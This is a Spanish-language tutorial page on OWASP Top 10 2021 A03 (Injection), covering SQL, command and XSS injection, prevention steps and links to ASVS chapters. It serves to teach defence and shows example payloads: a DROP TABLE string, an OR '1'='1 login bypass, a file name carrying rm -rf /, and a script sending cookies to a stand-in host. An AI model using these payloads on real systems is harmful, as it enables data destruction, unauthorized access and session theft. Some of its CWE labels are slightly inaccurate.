---
title: "A03: Injection (Inyección)"
description: "OWASP Top 10 2021 A03: qué es, escenarios de ataque, cómo prevenirlo y su relación con el ASVS."
---

Imagina que alguien escribe en el formulario de búsqueda de tu web: `'; DROP TABLE usuarios; --`. Si tu aplicación lo ejecuta tal cual, acabas de perder la tabla de usuarios. Así de brutal es la **inyección**: el dato del usuario se convierte en código.

> **A03:2021 Injection** — en 2017 era el riesgo número uno; ahora ocupa el tercer puesto, pero sigue siendo devastador: golpea SQL, comandos del sistema, LDAP, XML (XXE) y plantillas. Las **CWEs más frecuentes** son CWE-79 (XSS), CWE-89 (SQL injection), CWE-73 y CWE-74.

## ¿En qué consiste?

La inyección ocurre cuando la aplicación **interpreta como código** algo que era un **dato**. Ocurre porque la entrada del usuario se **concatena directamente** en:

- Consultas SQL (SQLi): `SELECT * FROM usuarios WHERE nombre = '$nombre'`.
- Comandos del sistema (command injection): `mv foto.jpg $nombre`.
- LDAP, XPath, plantillas (SSTI), JSON... y **XSS** (el script del atacante se inyecta en la página).

**CWEs asociadas:** CWE-79 (XSS), CWE-89 (SQLi), CWE-73 (path traversal), CWE-74 (command injection), CWE-77, CWE-90 (LDAP), CWE-94 (plantillas), CWE-95.

## Escenarios de ataque comunes

1. **SQL injection en el login:** el atacante envía `' OR '1'='1` como contraseña y la consulta devuelve la primera cuenta — entra como admin.
2. **Command injection en archivos:** la app renombra un archivo con `mv archivo $nombre`; el atacante sube un archivo llamado `foto; rm -rf /` y ejecuta sus comandos en el servidor.
3. **XSS almacenado:** un comentario con `<script>fetch('//malo.com?c='+document.cookie)</script>` se ejecuta en el navegador de cada visitante y roba sesiones.

## Cómo prevenirlo

- **Consultas parametrizadas** (prepared statements) para SQL — el dato nunca altera la estructura de la consulta.
- **Validación de entrada con listas de permitidos** (allow lists): tipo, longitud, patrón, rango.
- **Codificación de salida según el contexto** (HTML, JavaScript, URL...) — el dato se muestra, no se ejecuta.
- **Nunca concatenar entrada del usuario en comandos del sistema**; usar APIs seguras.
- **Escape o validación** en LDAP, XPath y motores de plantillas.
- **CSP** (Content Security Policy) como red de seguridad frente a XSS.

## Relación con el ASVS

- **V5 Validación, Desinfección y Codificación** — el capítulo central: validación positiva, consultas parametrizadas, codificación de salida y deserialización segura (`/capitulos/v5-validacion`).
- **V13 API** — validación de esquemas JSON/XML y tipos de contenido (`/capitulos/v13-api`).
- **V14.4 Encabezados de seguridad** — CSP y Content-Type (`/capitulos/v14-configuracion`).

## Resumen

> A03 es el riesgo de mezclar datos con código: la entrada del usuario
> nunca debe poder cambiar la estructura de una consulta, un comando o una
> página. Parametrizar, validar con listas de permitidos y codificar la
> salida eliminan la gran mayoría de estas vulnerabilidades.